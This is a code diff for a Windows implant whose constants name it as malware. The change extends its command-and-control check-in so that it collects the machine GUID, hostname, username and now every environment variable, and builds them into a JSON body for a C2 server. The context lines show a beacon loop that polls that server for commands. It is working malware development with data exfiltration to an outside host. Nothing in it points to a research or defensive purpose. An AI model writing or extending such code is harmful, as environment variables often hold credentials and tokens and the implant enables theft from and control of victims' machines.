@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <algorithm>
 #include <string.h>
 #include <sysinfoapi.h>
 #include <winbase.h>
@@ -55,14 +56,36 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
         return -1;
     }
     std::wstring requestHeader(MALWARE_JSON_REQUEST_HEADER); // build post request header
-    std::string requestBody;                                // build post request body i.e. json
+    std::string requestBody;                                 // build post request body i.e. json
     requestBody += "{\"guid\":\"";
     requestBody += systemGuidValue;
     requestBody += "\",\"hostname\":\"";
     requestBody += systemHostname;
     requestBody += "\",\"username\":\"";
     requestBody += systemUsername;
-    requestBody += "\"}";
+    requestBody += "\", \"enviroment_variables\":{";
+    char *env_resultBuffer = (char *)malloc(sizeof(char) * 4096);
+    for (wchar_t **env = envp; *env != 0; env++)
+    {
+        wcstombs(env_resultBuffer, *env, 4096);
+        requestBody += "\"";
+        requestBody += strtok(env_resultBuffer, "=");
+        requestBody += "\":\"";
+        char *iter = strtok(NULL, "\\=");
+        while (iter != NULL)
+        {
+            // sanitize string for json
+            requestBody += iter;
+            requestBody += "\\\\";
+            iter = strtok(NULL, "\\=");
+            LOG(L"iter: %s\n", iter);
+        }
+        requestBody += "\b\b\",";
+        memset(env_resultBuffer, 0, 4096);
+    }
+    free(env_resultBuffer);
+    requestBody += "\b}}";
+    std::cout << requestBody << std::endl;
     std::wstring result;
     do
     {
@@ -78,7 +101,7 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
     while (true)
     {
         result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_CHECKIN_URI, NULL, NULL, MALWARE_C2_SERVER_USE_TLS);
-        
+
         switch (opCode)
         {
         case SLEEP:
